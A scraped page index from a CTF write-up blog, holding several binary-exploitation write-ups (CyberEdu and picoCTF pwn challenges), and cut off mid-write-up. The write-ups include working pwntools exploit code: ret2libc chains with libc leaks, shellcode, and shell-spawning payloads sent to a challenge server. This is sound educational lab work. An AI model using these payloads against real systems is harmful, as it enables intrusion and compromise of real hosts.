From there on, we can easily calculate /bin/sh, at system + 0x174c32, through gef.\np.recvuntil(\u0026#39;\\n\u0026#39;) p.sendline(b\u0026#39;kkt\u0026#39;) p.recvuntil(b\u0026#39;: \u0026#39;) system = int(p.recv(10), 16) log.success(f\u0026#39;system: {hex(system)}\u0026#39;) binsh = system + 0x174c32 log.success(f\u0026#39;binsh: {hex(binsh)}\u0026#39;) The Exploit Now, to use this buffer overflow; We read 100 bytes in s1[32], which is at ebp - 76. For some reason the printf(\u0026quot;PASS \u0026quot;) and printf(\u0026quot;USER \u0026quot;) don\u0026rsquo;t appear locally for me, so I might have to modify them later, for the remote version.\nAnd so we pop a shell locally! Now let\u0026rsquo;s try remotely as well.\nThat\u0026rsquo;s, well, interesting. The ./flag.sh makes me think we did something right. I modified the p.recvuntil() to consider the printf(\u0026quot;PASS \u0026quot;) and printf(\u0026quot;USER \u0026quot;) as getting displayed, but we get a similar error. Maybe the error is the offset from system to /bin/sh.\nSo, using blukat with the known system value, I identified the remote version as 2.35, and guess what - shell!\nAfter a ls, the only two files we see are flag.sh and ftp_server. After digging around files for the flag, I decided to just search the entire system for it using some commands. In the end, this is what worked:\nAs always, the full code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/ftpconsole-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eWe got a very strange \u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/9d17bf1a-69a7-418a-b3bb-569286ab8d7b?tenant=cyberedu\"\u003eftp console?\u003c/a\u003e\u003c/strong\u003e Can you retrive the flag?\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ftpconsole-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003eftp_server\u003c/strong\u003e looks like a 32-bit executable, and as hinted by the name, a FTP (File Transfer Protocol) server mockup.\u003c/p\u003e\n\u003cp\u003eUpon checking, every protection is disabled, so that\u0026rsquo;s nice! Now let\u0026rsquo;s take a look at the binary.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ftpconsole-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe have a \u003ccode\u003emain\u003c/code\u003e function that calls \u003ccode\u003elogin\u003c/code\u003e, and we can already see some interesting things going on.\u003c/p\u003e","title":"CyberEdu ftp-console Writeup"},{"content":"Challenge overview Oh no! I lost my flag somewhere in memory. Can you help me find it, please? Make sure to do it quickly!\nUpon trying to run the binary, we are greeted by a so version mismatch, but I won\u0026rsquo;t bother downloading it myself, so let\u0026rsquo;s see if we can solve it remotely. We can see it is a 32-bit binary though.\nTaking a look at main, we can see the flag getting copied into a dest buffer. Our input is stored into buf.\nFirst, we mmap (memory map, aka allocate memory in a mmap region for) the buf, and then call munmap (memory unmap, does the opposite) on it.\nThen, this line of code\n((void (__stdcall *)(int, int, void *))buf)(v4, v5, dest);\nexecutes the instructions inside buf. Since it already has 0, 0, flag as parameters, I made a little shellcode that calls write to display the flag.\nfrom pwn import * p=remote(\u0026#39;34.159.14.234\u0026#39;, 30452) context.arch = \u0026#39;i386\u0026#39; p.recvuntil(b\u0026#39;t\u0026#39;) shellcode = asm(\u0026#34;\u0026#34;\u0026#34; mov ecx, [esp+12] mov eax, 4 mov ebx, 1 mov edx, 100 int 0x80 xor ebx, ebx mov eax, 1 int 0x80 \u0026#34;\u0026#34;\u0026#34;) p.sendline(shellcode) p.interactive() You wouldn\u0026rsquo;t guess what got printed. The exact string from the binary. I assumed it was a decoy, but yeah, that was the flag, didn\u0026rsquo;t even have to go trough all this trouble!\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/lost-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eOh no! I lost my flag somewhere in memory. Can you \u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/1cfe88c0-44a0-11ed-9561-9d3e2d8bb042?tenant=cyberedu\"\u003ehelp me\u003c/a\u003e\u003c/strong\u003e find it, please? Make sure to do it quickly!\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/lost-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eUpon trying to run the binary, we are greeted by a \u003ccode\u003eso\u003c/code\u003e version mismatch, but I won\u0026rsquo;t bother downloading it myself, so let\u0026rsquo;s see if we can solve it remotely. We can see it is a 32-bit binary though.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/lost-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eTaking a look at main, we can see the flag getting copied into a \u003ccode\u003edest\u003c/code\u003e buffer. Our input is stored into \u003ccode\u003ebuf\u003c/code\u003e.\u003c/p\u003e","title":"CyberEdu Lost Writeup"},{"content":"Challenge overview You can\u0026rsquo;t run shellcode if all registers are 0, right?\nOur binary main is a 64-bit executable with an obvious buffer overflow vulnerability. Let\u0026rsquo;s take a look at it using a disassembler.\nWe only have one function, main, which mmaps dest, copies 3 bytes of what\u0026rsquo;s inside \u0026amp;unk_2027 into dest, then lets us write 0x1000 bytes into dest+3. That means our buffer overflow is only 3 bytes, though. Afterwards, it executes this assembly shellcode:\n__asm { vpxord zmm0, zmm0, zmm0 vmovdqa64 zmm1, zmm0 vmovdqa64 zmm2, zmm0 vmovdqa64 zmm3, zmm0 vmovdqa64 zmm4, zmm0 vmovdqa64 zmm5, zmm0 vmovdqa64 zmm6, zmm0 vmovdqa64 zmm7, zmm0 vmovdqa64 zmm8, zmm0 vmovdqa64 zmm9, zmm0 vmovdqa64 zmm10, zmm0 vmovdqa64 zmm11, zmm0 vmovdqa64 zmm12, zmm0 vmovdqa64 zmm13, zmm0 vmovdqa64 zmm14, zmm0 vmovdqa64 zmm15, zmm0 vmovdqa64 zmm16, zmm0 vmovdqa64 zmm17, zmm0 vmovdqa64 zmm18, zmm0 vmovdqa64 zmm19, zmm0 vmovdqa64 zmm20, zmm0 vmovdqa64 zmm21, zmm0 vmovdqa64 zmm22, zmm0 vmovdqa64 zmm23, zmm0 vmovdqa64 zmm24, zmm0 vmovdqa64 zmm25, zmm0 vmovdqa64 zmm26, zmm0 vmovdqa64 zmm27, zmm0 vmovdqa64 zmm28, zmm0 vmovdqa64 zmm29, zmm0 vmovdqa64 zmm30, zmm0 vmovdqa64 zmm31, zmm0 jmp rax } What this chunk of shellcode does is, as the challenge description suggests, clears all the zmm registers. So, basically, turn everything to 0.\nIdentifying the vulnerabilities We don\u0026rsquo;t need to worry about a canary, but the binary does have NX and PIE enabled.\nThe value at \u0026amp;unk_2027 is 0xc03148, after inspecting with gdb.\nOkay, so what seems interesting is the jmp rax at the end of the asm instructions. Most likely, the return of read will be stored in rax, after the read. So let\u0026rsquo;s set a breakpoint inside main, before the asm code, to see what rax looks like.\nInteresting! This looks like dest, the 3 bytes inside \u0026amp;unk_2027, and the rest of our string! So jmp rax will jump to dest, to our input - problem is, it has to look like 0xa.....c03148. So what can we do with this? It\u0026rsquo;s already pretty bad, the a really ruins it (the newline).\nWhat\u0026rsquo;s more, the program terminates with SIGILL before we even reach the jmp rax. This might be an us-problem though.\nI found that we can get rid of the a in our payload by completely ljusting the dest (4096 bytes) with null bytes, which causes the a to be appended in those 3 bytes that aren\u0026rsquo;t a part of dest. So that solves the newline problem.\nAs expected, their program doesn\u0026rsquo;t crash, and probably executes the jmp rax. That\u0026rsquo;s settled, so let\u0026rsquo;s go back to debugging.\nSomething important - dest is stored in rwx data - this means we can execute code inside dest. And since my program crashes really early on, it\u0026rsquo;s possible that the rax we see to not be accurate, so that it might not point to dest in the actual remote binary.\nAlright, so that means that these bytes - 0xc03148 - are actually being interpreted as shellcode! And 0xc03148 - 48 31 c0 - as opcode is xor rax, rax! Looks right! So we just need to add a payload here. Unfortunately, we can\u0026rsquo;t really test locally, so we can\u0026rsquo;t debug properly.\nMy idea was a payload like this:\nshellcode = b\u0026#39;\\x90\u0026#39;*8+ asm(shellcraft.sh()) payload = shellcode.ljust(4096, b\u0026#39;\\x90\u0026#39;) print(payload) But remotely, we keep getting EOF. After a bit of research, turns out the challenge is broken, and the solution was something along these lines.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/stack-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eYou can\u0026rsquo;t run shellcode if all registers are 0, \u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/cd88b0e0-44a2-11ed-8a0d-17ff1fb32f1f?tenant=cyberedu\"\u003eright\u003c/a\u003e\u003c/strong\u003e?\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stack-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eOur binary \u003cstrong\u003emain\u003c/strong\u003e is a 64-bit executable with an obvious buffer overflow vulnerability. Let\u0026rsquo;s take a look at it using a disassembler.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stack-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe only have one function, \u003ccode\u003emain\u003c/code\u003e, which \u003ccode\u003emmap\u003c/code\u003es \u003ccode\u003edest\u003c/code\u003e, copies 3 bytes of what\u0026rsquo;s inside \u003ccode\u003e\u0026amp;unk_2027\u003c/code\u003e into \u003ccode\u003edest\u003c/code\u003e, then lets us write 0x1000 bytes into \u003ccode\u003edest+3\u003c/code\u003e. That means our buffer overflow is only 3 bytes, though.  Afterwards, it executes this assembly shellcode:\u003c/p\u003e","title":"CyberEdu Stack Writeup"},{"content":"Challenge overview We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.\nThe challenge was proposed by BIT SENTINEL.\nAt first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn\u0026rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let\u0026rsquo;s take a look at the binary.\nWe can see a couple of functions inside the binary, main, helper, l00p, vuln and fake.\nHelper returns savedregs.\nThis function returns fake and displays \u0026ldquo;Try harder\u0026rdquo; if our input isn\u0026rsquo;t \u0026quot;#!@{try_hard3r}\u0026quot;, and otherwise returns vuln.\nThe fake function takes \u0026ldquo;junk\u0026rdquo; input and returns to l00p.\nFinally, our vuln stores input in v1 and outputs \u0026ldquo;Hacker alert\u0026rdquo;.\nIdentifying the vulnerabilities About all of these functions (except l00p, because of that strcmp that redirects us) have a buffer overflow vulnerability - this makes me thing about popping a shell. So let\u0026rsquo;s analyze the binary and see if we can find any /bin/sh in memory.\nWell, I look at that! The libc /bin/sh!\nUsing the buffer overflow in vuln, I made a pop_rdi_ret + helper + p64(elf.plt['puts'] to see if there\u0026rsquo;s anything interesting in helper but it didn\u0026rsquo;t seem like it.\nThe exploit Since the program uses ASLR, we can\u0026rsquo;t just know where /bin/sh and system are going to be. So we could try a ret2libc, and then calculating the offsets.\np.sendline(b\u0026#34;A\u0026#34;*112 + b\u0026#39;\\x90\u0026#39;*8 + pop_rdi_ret + p64(elf.got[\u0026#39;puts\u0026#39;]) + p64(elf.plt[\u0026#39;puts\u0026#39;]) + l00p) p.recvline() leak = p.recv(6) leaked = u64( leak.ljust(8, b\u0026#39;\\x00\u0026#39;)) print(f\u0026#34;leak: {hex(leaked)}\u0026#34;) puts_offset = 0x585a0 libc = leaked - puts_offset print(f\u0026#34;libc: {hex(libc)}\u0026#34;) This gets us our libc address successfully!\nNow all that\u0026rsquo;s left to do is calculate the offsets to /bin/sh and system.\nbinsh_offset = 0x17fea4 binsh = libc + binsh_offset system_offset = 0x2b110 system = libc + system_offset print(f\u0026#34;binsh: {hex(binsh)}\u0026#34;) print(f\u0026#34;system: {hex(system)}\u0026#34;) #l00p p.recvuntil(b\u0026#34;: \u0026#34;) p.sendline(b\u0026#34;#!@{try_hard3r}\u0026#34;) #vuln p.recvuntil(b\u0026#34;: \u0026#34;) #bufoverflow -\u0026gt; ret to l00p p.sendline(b\u0026#34;A\u0026#34;*112 + b\u0026#39;\\x90\u0026#39;*8 + pop_rdi_ret + p64(binsh) + p64(system) + l00p) Everything seemed to be going alright, we entered the system function with the correct /bin/sh pointer, but we end up getting a SIGSEGV. Most likely, this is an alignment issue, so let\u0026rsquo;s find a ret gadget to our payload.\nWe did it!!! All it took was adding the ret gadget like so:\np.sendline(b\u0026#34;A\u0026#34;*112 + b\u0026#39;\\x90\u0026#39;*8 + pop_rdi_ret + p64(binsh) + ret + p64(system) + l00p) Different libc versions Now, the worst part - testing remotely.\nUnsurprising\u0026hellip; This always happens. I tried moving the ret gadget around, but most probably our version of glibc is different from what they\u0026rsquo;re using. How are we even supposed to figure it ourselves?\nUsing strings pwn_bazooka_bazooka | grep -i glibc, I tried to take a look at what the binary contains, so we can try the known offsets for 2.27, since it\u0026rsquo;s the latest version included here.\nSince the challenge came out in 2020, the very latest version it could have been is 2.31. That helps narrow it down a little.\nAnd we can use blukat\u0026rsquo;s symbols library to find the 2.27 version offsets for puts (found as IO_puts), bin_sh and system.\nIt worked, first try! I\u0026rsquo;m just glad we didn\u0026rsquo;t have to go through 5 different libraries to solve this.\nAs always, the rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eWe have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/ae81c600-347c-11eb-a2b9-a539e3b969ab?tenant=cyberedu\"\u003eThe challenge\u003c/a\u003e\u003c/strong\u003e was proposed by BIT SENTINEL.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/bazooka-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003epwn_bazooka_bazooka\u003c/strong\u003e looks like a 64-bit executable, and I didn\u0026rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a \u003cem\u003emessage\u003c/em\u003e input and a \u003cem\u003ejunk\u003c/em\u003e input. So let\u0026rsquo;s take a look at the binary.\u003c/p\u003e","title":"CyberEdu Bazooka Writeup"},{"content":"Challenge overview I am once again asking for you to pwn this binary\nAt first glance, the vuln looks like a 64-bit executable with a buffer overflow vulnerability. And since it\u0026rsquo;s hinted in the title, most probably a ret2libc challenge.\nUpon checking, only NX is enabled. So this should make things fairly easy for us.\nIdentifying the vulnerabilities We can quickly check if there\u0026rsquo;s a /bin/sh in memory, and there it is! Along with a system and also execve.\nNow, let\u0026rsquo;s analyze the binary; there\u0026rsquo;s some pretty weird variables in .rodata:\nThey\u0026rsquo;re used inside our do_stuff() loop, to calculate how much input is going to be read.\n%[^\\n] is a scan set; What is a scan set you might ask?\nWell, scan sets begin with %[ and ends with ]. The insides, in this case ^\\n, mean read everything except a newline. So basically, read everything until the first \\n and store it in s[112]. So, classic buffer overflow.\nAnd %c is probably just going to store that newline that we didn\u0026rsquo;t read.\nSo, since we\u0026rsquo;re working with 64-bit, let\u0026rsquo;s find a pop rdi; ret gadget with ropper. We have one at 0x400913.\nThe challenge includes a libc.so.6 to download, and a Makefile that specifies the binary will try to use the ./libc.so.6 before the system-wide libc. After installing it, and trying to run the binary, I stumbled upon this error:\n./vuln Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL\u0026#39; failed! Which meant that my dynamic loader wasn\u0026rsquo;t compatible with the challenge\u0026rsquo;s libc.so.6. And they didn\u0026rsquo;t give us a compatible dynamic loader to download.\nAfter inspecting the libc.so.6 with strings, and looking for GLIBC to see if we find any clues, we can find GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27..\nWhich is an older version of the system loader, the ld-2.27.so one, from ubuntu:18.04. I\u0026rsquo;m assuming this is a mistake in the challenge, but let\u0026rsquo;s see if we can still solve this challenge.\nFinding the correct system loader After some research, looks like we need to download both ld-2.27.so and ld-linux-x86-64.so.2 and place them in the same folder as vuln.\nI downloaded glib27 here found as libc6_2.27-3ubuntu1_amd64.deb glibc27 and did this, which got our chall working again:\nBecause we always need a specific command to run it using these libraries, we need to write this argument to p.process() in pwntools:\np = process([\u0026quot;./ld-linux-x86-64.so.2\u0026quot;, \u0026quot;--library-path\u0026quot;, \u0026quot;.\u0026quot;, \u0026quot;./vuln\u0026quot;])\nFinally, it worked! And, unsurprisingly, we get different locations for our /bin/sh and system every time we run the challenge (ASLR). I found the offsets:\nbinsh = libc + 0x1B40FA\nsystem = libc + 0x14B37\nSo first, we need to leak libc, the classic ret2plt way, puts(elf.got['puts'].\nThe Exploit Our s[112] input string starts at ebp - 128, so we start by adding 128*b'A'padding in our payload, then another 8 bytes for rbp, (since we\u0026rsquo;re on 64-bit; on 32-bit rbp is 4 bytes), then our pop rdi; ret gadget, elf.got['puts'] as our function parameter, then the elf.plt['puts'], the action function we call, and then the address of do_stuff to return to it once the function is finished.\np.sendline(b\u0026#39;A\u0026#39;*128 + b\u0026#39;\\x90\u0026#39;*8 + pop_rdi + p64(elf.got[\u0026#39;puts\u0026#39;]) + p64(elf.plt[\u0026#39;puts\u0026#39;]) + do_stuff) That looks like a libc.so.6 address! In this instance, puts is located at 0x7f89b2212787, and the address we print looks like 0x7f89b2280000, and they are clearly different, but that\u0026rsquo;s alright; We can just calculate the offset from libc to our leak with gef and problem solved.\nWe should use something like libc_puts = u64(leaked.ljust(10, b\u0026quot;\\x00\u0026quot;)), but first get rid of the first two lines.\np.recvlines(2) leaked = p.recvline().strip().ljust(8, b\u0026#34;\\x00\u0026#34;) leaked_puts = u64(leaked) print(hex(leaked_puts)) This however would pad it to the wrong side, and the leak would look like 0x0000007f89b228 instead of 0x007f89b2280000. So I replaced it with\np.recvlines(2) leaked = p.recvline().strip().rjust(6, b\u0026#34;\\x00\u0026#34;).ljust(8, b\u0026#34;\\x00\u0026#34;) leaked_puts = u64(leaked) print(hex(leaked_puts)) To add two x00s to the left, and two to the right, and we finally get the proper format for the leak.\nThe offset from libc is 0x80000, so we just subtract the offset from the leak, and we get libc!\nNow, we can calculate system and /bin/sh based on their offsets from libc, and add another payload that pops us a shell. The payload is essentially the same, but we change the function being called and its argument.\nWhat happened? Our rdi is correctly pointing to /bin/sh, but it looks like system isn\u0026rsquo;t working as expected\u0026hellip; After closer inspection, the offset we found was to a string \u0026ldquo;system\u0026rdquo;. Oops. Let\u0026rsquo;s try looking for the actual libc function.\nThe correct way to search for a function, not a string, in gef is info functions system.\nSo the correct offset is at 0x4f4e0. But we get another EOF. Most probably, this is an alignment issue, so we can just add another ret; gadget before calling system.\nAnd we pop a shell!\nNow let\u0026rsquo;s connect remotely:\nWell\u0026hellip; This is getting annoying, especially after having to manually look for and download the files they didn\u0026rsquo;t include and I doubt finding the missing linker was part of the challenge\u0026hellip;\nI added a string = p.recvlines(2), print(string) to debug what\u0026rsquo;s happening, and it looks like unlike locally, the garbage data is only getting printed on the first line. So we can just change it to p.recvline() and it should be fine.\nAre you kidding me?! Since when are we working with a canary? And the address getting leaked looks like a different one than the one we were working with\u0026hellip;\nAfter checking again, it\u0026rsquo;s because this time we get the full 8 bytes of the leak:\nSo we need to figure out what is actually getting printed, to calculate the correct offset. Some outputs are:\n0x7f3ed7b84a30\n0x7fe043473a30\n0x7fc96755ba30\n0x7f28f2774a30\n0x7fd633bf9a30\nWhat seems to be the offset here? They all seem to share the 0xa30 ending but the 4th byte differs.\nI printed the libc symbols for our libc.so.6:\nputs offset: 0x80a30 system offset: 0x4f4e0 /bin/sh offset: 0x1b40fa And would you look at that, it\u0026rsquo;s quite exactly puts\u0026rsquo;s offset - so this time it works properly, unlike when we were testing locally. So we calculate our libc based on that, but we still bump into the EOF error.\n0x7efd239b1a30 0x7efd23931000 [*] Switching to interactive mode timeout: the monitored command dumped core [*] Got EOF while reading in interactive Something\u0026rsquo;s missing; Most probably a stack alignment issue. At this point I felt like I was missing something else, and I tried to find the solution online, but everything I did appeared to be in order.\nSo what was missing? I printed the received line before every line of code, and turns out we were getting the timeout: the monitored command dumped core\\n before sending the system payload.\nFirst guess - we didn\u0026rsquo;t return into the right function, after the first payload. So let\u0026rsquo;s change it from do_stuff to main. And - finally - we did it!\nAs always, the full code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/heresalibc-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eI am once again asking for you to pwn this \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/179\"\u003ebinary\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/heresalibc-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 64-bit executable with a buffer overflow vulnerability. And since it\u0026rsquo;s hinted in the title, most probably a ret2libc challenge.\u003c/p\u003e\n\u003cp\u003eUpon checking, only \u003ccode\u003eNX\u003c/code\u003e is enabled. So this should make things fairly easy for us.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerabilities\"\u003eIdentifying the vulnerabilities\u003c/h2\u003e\n\u003cp\u003eWe can quickly check if there\u0026rsquo;s a \u003ccode\u003e/bin/sh\u003c/code\u003e in memory, and there it is! Along with a \u003ccode\u003esystem\u003c/code\u003e and also \u003ccode\u003eexecve\u003c/code\u003e.\u003c/p\u003e","title":"Pico Here's A LIBC Writeup"},{"content":"Challenge overview \u0026ldquo;time to do some homework!\u0026rdquo;\nAt first glance, homework looks like a 64-bit executable, but we can\u0026rsquo;t tell much about it.\nAfter using checksec, sadly, PIE is enabled and so is NX.\nWe have a main function (picture above) and a step function. The step function uses and then modifies some variables declared/located in the .bss, so it would be good to see what they look like before execution starts.\nChar board[1100] is at offset 0x5260 from the first read-only section of the binary, int sn at 0x50A0, int stack[104] at 0x50C0, rows at 0x56AC, cols at 0x56B0, diry at 0x56B4, dirx a bit further at 0x5078.\nAs we can see, most of them begin as 0, except the cols and rows (same values as in main) and the dirx starting as 0x1.\nAlso, the flag is stored in the stack, so we might find a way to leak it.\nThe step function is a bit more complicated, with a switch for a lot of operands for the char at board[22 * pcy + pcx]. For each one, sn is checked against some conditions, and `__assert_fail()\u0026rsquo; is used.\nAfter reading the function\u0026rsquo;s documentation, what it does is it aborts the program if the assertion is false, and all of these assertions are either checking sn \u0026gt;= to 1, 2 or 3, or stack[sn-1] \u0026lt;= rows \u0026amp;\u0026amp; stack[sn-2] \u0026lt;= cols.\nThen, most of them redirect to LABEL_76:\nThis relocates pcx (our x position in board, inside step) and our pcy (y position in board inside step).\ndirx and diry seem like regular matrix directions, with values from [-1, 0, 1].\nThen, for each iteration, it falls through to LABEL76, and for normal characters it just seems to iterate through board[], until it finds a special operand.\nHere is everything it does, simplified for a better understanding:\n\u0026#39;!\u0026#39;: if(sn \u0026lt;= 0) abort stack[sn - 1] = 1, if it was 0 stack[sn - 1] = 0, otherwise \u0026#39;$\u0026#39;: if(sn \u0026lt;= 0) abort --sn \u0026#39;%\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] %= stack[sn - 1] --sn \u0026#39;*\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] *= stack[sn-1] --sn \u0026#39;+\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] += stack[sn-1] --sn \u0026#39;,\u0026#39;: if(sn \u0026lt;= 0) abort putchar(stack[--sn]) #print a char at stack[--sn] \u0026#39;-\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] -= stack[sn-1] --sn \u0026#39;.\u0026#39;: if(sn \u0026lt;= 0) abort printf(%d, stack[--sn]) #this might help us leak stack! \u0026#39;/\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] /= stack[sn-1] --sn \u0026#39;:\u0026#39;: if(sn \u0026lt;=0 ) abort stack[sn] = stack[sn-1] ++sn \u0026#39;\\\\\u0026#39;: if(sn\u0026lt;=1) abort swap(stack[sn-1], stack[sn-2]) #xor swap \u0026#39;`\u0026#39;: if(sn\u0026lt;=1) abort stack[sn-2] = stack[sn-2] \u0026gt; stack[sn-1] \u0026#39;g\u0026#39;: if(sn\u0026lt;=1) abort if( 0 \u0026lt;= stack[n-1] \u0026lt;= rows \u0026amp;\u0026amp; 0 \u0026lt;= stack[n-2] \u0026lt;= cols) #bounds check stack[sn-2] = board[22 * stack[sn-1] + stack[sn-2]] #stack[sn-2] = board[stack[sn-1]][stack[sn-2]] --sn \u0026#39;p\u0026#39;: if(sn\u0026lt;=2) abort if( 0 \u0026lt;= stack[n-1] \u0026lt;= rows \u0026amp;\u0026amp; 0 \u0026lt;= stack[n-2] \u0026lt;= cols) #bounds check board[22 * stack[sn-1] + stack[sn-2]] = stack[sn-3] #board[stack[sn-1]][stack[sn-2]] = stack[sn-3] sn-=3 \u0026#39;\u0026lt;\u0026#39;: dirx = -1 diry = 0 #go to the previous element in board array \u0026#39;\u0026gt;\u0026#39;: dirx = 1 diry = 0 #go to the next element in board array \u0026#39;^\u0026#39;: dirx = 0 diry = -1 #move up a row in board \u0026#39;v\u0026#39;: dirx = 0 diry = 1 #move down a row in board \u0026#39;_\u0026#39;: if(sn\u0026lt;=0) abort if(stack[--sn] dirx= - 1 else dirx = 1 diry = 0 \u0026#39;|\u0026#39;: if(sn\u0026lt;=0) abort if(stack[--sn] diry = -1 else diry = 1 dirx = 0 \u0026#39;@\u0026#39;: return 0; default: if(board[22* pcy + pcx] == \u0026#39;0\u0026#39;]) if(sn\u0026gt;99) abort v1 = sn++ stack[v1] = 0 LABEL_76: #update pcx and pcy based on dirx and diry return 1 Every case except the @ which returns 0, will step into LABEL_76.\nQuite a long function isn\u0026rsquo;t it?\nWe can conclude that pcx and pcy probably stand for player/position current x and y.\nThe case that seems the most interesting is the . since it does printf(%d, stack[--sn]. In .bss we have:\nstack[0]: 0x50C0\nflag: 0x56E0\nAnd so the offset between them is 0x620, or 1568 in decimal. Since int_size is 4 bytes, that means by accessing stack[392] we should reach flag\u0026rsquo;s .bss location.\nThe only cases that raise our sn are the : and default case, and they both only raise sn by 1.\nAnd, the 22*i byte of board is always 0.\nTo be fair, this solution seems too good to be true, but let\u0026rsquo;s explore it anyways.\nMy first Idea With the input 0::::::::::::::::::::::::::[and so on] we managed to raise sn so that stack[sn] overwrites some data.\nI also tried a loop \u0026gt;\u0026gt;:::\u0026lt;\u0026lt; that theoretically should\u0026rsquo;be incremented sn forever.\nBut this only gets us to sn = 110.\nFor some reason after sn reaches 110 it wont enter the : anymore whatsoever, but it won\u0026rsquo;t abort either, weird. So maybe that\u0026rsquo;s not the way to go with this\u0026hellip;\nAt this point, I was starting to doubt modifying sn was the way to go, so I tried to find other any confirmation of this idea. The only two other writeups I found both overwrote the rows variable, which was directly after board on the .bss.\nBut I\u0026rsquo;m going to have a little faith in my idea so I will try to see if I can manage something before giving up.\nWhat I missed was that the stack was actually a stack (what a surprise, right?) and sn was the stack pointer.\nUnderstanding step and stack So almost every action was a pop() or a push(). It was very well explained in this writeup like this:\n0: push 0 to the top of the stack (also asserts if full) $: discard stack[top] !: logical NOT of top of stack (stack[top] = !stack[top]) `: sets stack[top-1] to result of stack[top] \u0026lt; stack[top-1] (does not pop anything, which is kinda weird) %: pops top 2 elements and pushes stack[top-1] % stack[top] /: pops top 2 elements and pushes stack[top-1] / stack[top] *: pops top 2 elements and pushes stack[top-1] * stack[top] +: pops top 2 elements and pushes stack[top-1] + stack[top] -: pops top 2 elements and pushes stack[top-1] - stack[top] ,: pops and prints stack[top] as ascii character (putchar) .: pops and prints stack[top] as 32-bit number (printf(\u0026#34;%d\u0026#34;)) :: duplicate stack[top] (NO BOUNDS CHECK!!!) \\: swap top 2 elements using XOR pc controls: \u0026lt;: set pc direction to left \u0026gt;: set pc direction to right ^: set pc direction to up v: set pc direction to down _: horizontal branch (pc goes right if stack[top]==0, left otherwise), pops stack[top] |: vertical branch (pc goes down if stack[top]==0, up otherwse), pops stack[top] @: stop program g: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3 elements Well, makes a lot more sense now!\nAnd look at this:\nWhen we reach sn = 109, after stack[sn] goes into the data immediately after stack which is board, so we overwrite board and fill the values with 0!!\nAnd we deleted our loop \u0026gt;\u0026gt;::::\u0026lt;\u0026lt; ourselves! Well, ideally, we would want to overwrite them with : instead of 0, right? and since we just duplicate the current top stack element and push it in the stack, if we manage to set the first character on the stack to be :, we might be able to avoid this!\nAdding numbers to stack First, to start summing/multiplicating numbers, we need to get two 1 values on the stack. The input we should give:\n0: push 0 on the stack\n!: pop; push 1;\n:: push 1;\nNow we have a stack that looks like [1, 1].\n+: pop a, pop b; push(a+b)\nNow stack looks like [2].\nSince in ASCII, : is 58, if we add a bunch of 2s, we can get stack[top] to become 58\nI\u0026rsquo;m thinking we duplicate the 2 using : and then multiply the first six ones, we reach 64. Then we can just decrement 2 another three times, and we get 